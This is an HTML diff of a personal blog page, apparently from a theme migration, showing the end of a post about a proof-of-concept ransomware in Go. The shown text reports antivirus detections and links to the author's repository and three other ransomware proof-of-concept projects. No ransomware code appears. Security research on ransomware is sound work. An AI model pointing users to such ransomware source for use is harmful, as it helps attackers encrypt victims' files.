 <p>The Windows version is the only one which is considered malicious, since 43 (!!) engines flagged it. Please note that the source code which was used to compile the three executables is exactly the same. Also, one of the functions in <code>goransom</code> is called <code>ransomware</code>, which may be the reason why some engines flags the Windows executable.</p>
 <p>Unfortunately <code>goransom</code> cannot be readily tested against public sandboxes, as it requires an input to be executed properly. I am not aware of online tools which allow this level of interaction with an executable, but if you know some, please let me know. It would be interesting to see the outcome.</p>
-<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
+
+
+<h2 class="relative group">Conclusion 
+    <div id="conclusion" class="anchor"></div>
+    
+</h2>
 <p><code>goransom</code> was super fun and relatively easy to make. The <code>crypto</code> package and the goroutines allow the code to be easy to read and efficient.</p>
 <p>There are a number of improvements which could be added, but, in the end, I consider the proof of concept successful as it is. And the fact that VirusTotal and Microsoft Security do not like <code>goransom</code> makes it even more successful.</p>
-<p>You can find <code>goransom</code> <a href="https://github.com/andpalmier/goransom" target="_blank" rel="noopener">on my GitHub</a>, let me know if you have suggestions or tips to improve the quality and structure of the code.</p>
-<p>If you are looking for other proof of concept of ransomware written in Go, check out these projects:</p>
-<ul>
-<li><a href="https://github.com/target111/go-crypt" target="_blank" rel="noopener">go-crypt</a></li>
-<li><a href="https://github.com/lucdew/goransomware" target="_blank" rel="noopener">goransomware</a></li>
-<li><a href="https://github.com/wille/cry" target="_blank" rel="noopener">go-cry</a></li>
-</ul>
+<p>You can find <code>goransom</code> on GitHub</p>
+<a id="github-fcaee6ba1da494f8080ecaa0493d5427" target="_blank" href="https://github.com/andpalmier/goransom" class="cursor-pointer">
+  <div
+    class="w-full md:w-auto pt-3 p-5 border border-neutral-200 dark:border-neutral-700 border rounded-md shadow-2xl">
 
+    <div class="flex items-center">
+      <span class="text-2xl text-neutral-800 dark:text-neutral" style="margin-right:10px;">
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+
+      </span>
+      <div
+        id="github-fcaee6ba1da494f8080ecaa0493d5427-full_name"
+        class="m-0 font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral">
+        andpalmier/goransom
+      </div>
+    </div>
+
+    <p id="github-fcaee6ba1da494f8080ecaa0493d5427-description" class="m-0 mt-2 text-md text-neutral-800 dark:text-neutral">
+      A proof of concept of a super simple ransomware written in Go
+    </p>
+
+    <div class="m-0 mt-2 flex items-center">
+
+      <span class="mr-1 inline-block h-3 w-3 rounded-full"
+        style="background-color: #00ADD8"></span>
+      <div class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral">
+         Go 
+      </div>
+
+      <span class="text-md mr-1 text-neutral-800 dark:text-neutral">
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentColor" d="M287.9 0C297.1 0 305.5 5.25 309.5 13.52L378.1 154.8L531.4 177.5C540.4 178.8 547.8 185.1 550.7 193.7C553.5 202.4 551.2 211.9 544.8 218.2L433.6 328.4L459.9 483.9C461.4 492.9 457.7 502.1 450.2 507.4C442.8 512.7 432.1 513.4 424.9 509.1L287.9 435.9L150.1 509.1C142.9 513.4 133.1 512.7 125.6 507.4C118.2 502.1 114.5 492.9 115.1 483.9L142.2 328.4L31.11 218.2C24.65 211.9 22.36 202.4 25.2 193.7C28.03 185.1 35.5 178.8 44.49 177.5L197.7 154.8L266.3 13.52C270.4 5.249 278.7 0 287.9 0L287.9 0zM287.9 78.95L235.4 187.2C231.9 194.3 225.1 199.3 217.3 200.5L98.98 217.9L184.9 303C190.4 308.5 192.9 316.4 191.6 324.1L171.4 443.7L276.6 387.5C283.7 383.7 292.2 383.7 299.2 387.5L404.4 443.7L384.2 324.1C382.9 316.4 385.5 308.5 391 303L476.9 217.9L358.6 200.5C350.7 199.3 343.9 194.3 340.5 187.2L287.9 78.95z"/></svg>
+  </span>
+
+
+      </span>
+      <div id="github-fcaee6ba1da494f8080ecaa0493d5427-stargazers" class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral">
+        8
+      </div>
+
+      <span class="text-md mr-1 text-neutral-800 dark:text-neutral">
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M80 104c13.3 0 24-10.7 24-24s-10.7-24-24-24S56 66.7 56 80s10.7 24 24 24zm80-24c0 32.8-19.7 61-48 73.3V192c0 17.7 14.3 32 32 32H304c17.7 0 32-14.3 32-32V153.3C307.7 141 288 112.8 288 80c0-44.2 35.8-80 80-80s80 35.8 80 80c0 32.8-19.7 61-48 73.3V192c0 53-43 96-96 96H256v70.7c28.3 12.3 48 40.5 48 73.3c0 44.2-35.8 80-80 80s-80-35.8-80-80c0-32.8 19.7-61 48-73.3V288H144c-53 0-96-43-96-96V153.3C19.7 141 0 112.8 0 80C0 35.8 35.8 0 80 0s80 35.8 80 80zm208 24c13.3 0 24-10.7 24-24s-10.7-24-24-24s-24 10.7-24 24s10.7 24 24 24zM248 432c0-13.3-10.7-24-24-24s-24 10.7-24 24s10.7 24 24 24s24-10.7 24-24z"/></svg>
+  </span>
+
+
+      </span>
+      <div id="github-fcaee6ba1da494f8080ecaa0493d5427-forks" class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral">
+        4
+      </div>
+
+    </div>
 
   </div>
+  <script>
+    fetch("https://api.github.com/repos/andpalmier/goransom", {
+      headers: new Headers({
+        'User-agent': 'Mozilla/4.0 Custom User Agent'
+      })
+    })
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById('github-fcaee6ba1da494f8080ecaa0493d5427-full_name').innerHTML = data.full_name;
+        document.getElementById('github-fcaee6ba1da494f8080ecaa0493d5427-description').innerHTML = data.description;
+        document.getElementById('github-fcaee6ba1da494f8080ecaa0493d5427-stargazers').innerHTML = data.stargazers_count;
+        document.getElementById('github-fcaee6ba1da494f8080ecaa0493d5427-forks').innerHTML = data.forks;
+      })
+      .catch(error => console.error(error))
+  </script>
+</a>
+<p>let me know if you have suggestions or tips to improve the quality and structure of the code.</p>
+<p>If you are looking for other proof of concept of ransomware written in Go, check out these projects:</p>
+<ul>
+<li><a href="https://github.com/target111/go-crypt" target="_blank">go-crypt</a></li>
+<li><a href="https://github.com/lucdew/goransomware" target="_blank">goransomware</a></li>
+<li><a href="https://github.com/wille/cry" target="_blank">go-cry</a></li>
+</ul>
 
-  <footer class="post-footer">
-    <ul class="post-tags">
-      <li><a href="https://andpalmier.com/tags/malware/">Malware</a></li>
-      <li><a href="https://andpalmier.com/tags/go/">Go</a></li>
-    </ul>
-  </footer><script src="https://utteranc.es/client.js"
+          
+          
+          
+        </div>
+        
+        
+
+        
+        
+  
+  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://andpalmier.com/posts/poc-goransom/&amp;title=Proof%20of%20concept%20of%20a%20ransowmare%20in%20Go"
+      title="Share on LinkedIn"
+      aria-label="Share on LinkedIn"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://twitter.com/intent/tweet/?url=https://andpalmier.com/posts/poc-goransom/&amp;text=Proof%20of%20concept%20of%20a%20ransowmare%20in%20Go"
+      title="Tweet on Twitter"
+      aria-label="Tweet on Twitter"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://bsky.app/intent/compose?text=Proof%20of%20concept%20of%20a%20ransowmare%20in%20Go&#43;https://andpalmier.com/posts/poc-goransom/"
+      title="Post on Bluesky"
+      aria-label="Post on Bluesky"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256,232.562c-21.183,-41.196 -78.868,-117.97 -132.503,-155.834c-51.378,-36.272 -70.978,-29.987 -83.828,-24.181c-14.872,6.72 -17.577,29.554 -17.577,42.988c0,13.433 7.365,110.138 12.169,126.281c15.873,53.336 72.376,71.358 124.413,65.574c2.66,-0.395 5.357,-0.759 8.089,-1.097c-2.68,0.429 -5.379,0.796 -8.089,1.097c-76.259,11.294 -143.984,39.085 -55.158,137.972c97.708,101.165 133.908,-21.692 152.484,-83.983c18.576,62.291 39.972,180.718 150.734,83.983c83.174,-83.983 22.851,-126.674 -53.408,-137.969c-2.71,-0.302 -5.409,-0.667 -8.089,-1.096c2.732,0.337 5.429,0.702 8.089,1.096c52.037,5.785 108.54,-12.239 124.413,-65.574c4.804,-16.142 12.169,-112.847 12.169,-126.281c-0,-13.434 -2.705,-36.267 -17.577,-42.988c-12.85,-5.806 -32.45,-12.09 -83.829,24.181c-53.634,37.864 -111.319,114.635 -132.502,155.831Z"/></svg>
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://s2f.kytta.dev/?text=Proof%20of%20concept%20of%20a%20ransowmare%20in%20Go%20https://andpalmier.com/posts/poc-goransom/"
+      title=""
+      aria-label=""
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M433 179.11c0-97.2-63.71-125.7-63.71-125.7-62.52-28.7-228.56-28.4-290.48 0 0 0-63.72 28.5-63.72 125.7 0 115.7-6.6 259.4 105.63 289.1 40.51 10.7 75.32 13 103.33 11.4 50.81-2.8 79.32-18.1 79.32-18.1l-1.7-36.9s-36.31 11.4-77.12 10.1c-40.41-1.4-83-4.4-89.63-54a102.54 102.54 0 0 1-.9-13.9c85.63 20.9 158.65 9.1 178.75 6.7 56.12-6.7 105-41.3 111.23-72.9 9.8-49.8 9-121.5 9-121.5zm-75.12 125.2h-46.63v-114.2c0-49.7-64-51.6-64 6.9v62.5h-46.33V197c0-58.5-64-56.6-64-6.9v114.2H90.19c0-122.1-5.2-147.9 18.41-175 25.9-28.9 79.82-30.8 103.83 6.1l11.6 19.5 11.6-19.5c24.11-37.1 78.12-34.8 103.83-6.1 23.71 27.3 18.4 53 18.4 175z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://reddit.com/submit/?url=https://andpalmier.com/posts/poc-goransom/&amp;resubmit=true&amp;title=Proof%20of%20concept%20of%20a%20ransowmare%20in%20Go"
+      title="Submit to Reddit"
+      aria-label="Submit to Reddit"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://www.facebook.com/sharer/sharer.php?u=https://andpalmier.com/posts/poc-goransom/&amp;quote=Proof%20of%20concept%20of%20a%20ransowmare%20in%20Go"
+      title="Share on Facebook"
+      aria-label="Share on Facebook"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+  </section>
+
+
+          
+      </div>
+     
+      
+      
+        
+        
+          
+          
+        
+      <script>
+        var oid = "views_posts\/poc-goransom\/index.md"
+        var oid_likes = "likes_posts\/poc-goransom\/index.md"
+      </script>
+      
+      
+      <script type="text/javascript" src="/js/page.min.0860cf4e04fa2d72cc33ddba263083464d48f67de06114529043cb4623319efed4f484fd7f1730df5abea0e2da6f3538855634081d02f2d6e920b956f063e823.js" integrity="sha512-CGDPTgT6LXLMM926JjCDRk1I9n3gYRRSkEPLRiMxnv7U9IT9fxcw31q&#43;oOLabzU4hVY0CB0C8tbpILlW8GPoIw=="></script>
+      
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+
+    
+    
+    <div class="pt-3">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="pt-3">
+        <script src="https://utteranc.es/client.js"
         repo="andpalmier/andpalmier.github.io"
         issue-term="og:title"
         label="comment"
@@ -366,139 +1297,53 @@
         async>
 </script>
 
-</article>
-    </main>
+      </div>
+    </div>
     
-<footer class="footer">
-        <span>&copy; 2024 <a href="https://andpalmier.com/">andpalmier</a></span> · 
+    
+  </footer>
+</article>
 
-    <span>
-        Powered by
-        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
-        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
-    </span>
-</footer>
-<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
-        <path d="M12 6H0l6-6z" />
-    </svg>
-</a><script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
 
-<script>
-const images = Array.from(document.querySelectorAll(".post-content img"));
-images.forEach(img => {
-  mediumZoom(img, {
-    margin: 0,  
-    scrollOffset: 40,  
-    container: null,  
-    template: null,  
-    background: 'rgba(0, 0, 0, 0.8)'
-  });
-});
-</script>
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      2024 - <a href="https://andpalmier.com" target="_blank">andpalmier.com</a>
+    </p>
+    
 
+    
+    
 
-<script>
-    let menu = document.getElementById('menu')
-    if (menu) {
-        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
-        menu.onscroll = function () {
-            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
-        }
-    }
-
-    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-        anchor.addEventListener("click", function (e) {
-            e.preventDefault();
-            var id = this.getAttribute("href").substr(1);
-            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
-                    behavior: "smooth"
-                });
-            } else {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
-            }
-            if (id === "top") {
-                history.replaceState(null, null, " ");
-            } else {
-                history.pushState(null, null, `#${id}`);
-            }
-        });
-    });
-
-</script>
-<script>
-    var mybutton = document.getElementById("top-link");
-    window.onscroll = function () {
-        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
-            mybutton.style.visibility = "visible";
-            mybutton.style.opacity = "1";
-        } else {
-            mybutton.style.visibility = "hidden";
-            mybutton.style.opacity = "0";
-        }
-    };
-
-</script>
-<script>
-    document.getElementById("theme-toggle").addEventListener("click", () => {
-        if (document.body.className.includes("dark")) {
-            document.body.classList.remove('dark');
-            localStorage.setItem("pref-theme", 'light');
-        } else {
-            document.body.classList.add('dark');
-            localStorage.setItem("pref-theme", 'dark');
-        }
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
     })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js" integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
 
-</script>
-<script>
-    document.querySelectorAll('pre > code').forEach((codeblock) => {
-        const container = codeblock.parentNode.parentNode;
-
-        const copybutton = document.createElement('button');
-        copybutton.classList.add('copy-code');
-        copybutton.innerHTML = 'copy';
-
-        function copyingDone() {
-            copybutton.innerHTML = 'copied!';
-            setTimeout(() => {
-                copybutton.innerHTML = 'copy';
-            }, 2000);
-        }
-
-        copybutton.addEventListener('click', (cb) => {
-            if ('clipboard' in navigator) {
-                navigator.clipboard.writeText(codeblock.textContent);
-                copyingDone();
-                return;
-            }
-
-            const range = document.createRange();
-            range.selectNodeContents(codeblock);
-            const selection = window.getSelection();
-            selection.removeAllRanges();
-            selection.addRange(range);
-            try {
-                document.execCommand('copy');
-                copyingDone();
-            } catch (e) { };
-            selection.removeRange(range);
-        });
-
-        if (container.classList.contains("highlight")) {
-            container.appendChild(copybutton);
-        } else if (container.parentNode.firstChild == container) {
-            
-        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
-            
-            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
-        } else {
-            
-            codeblock.parentNode.appendChild(copybutton);
-        }
-    });
-</script>
+  </div>
 </body>
 
 </html>
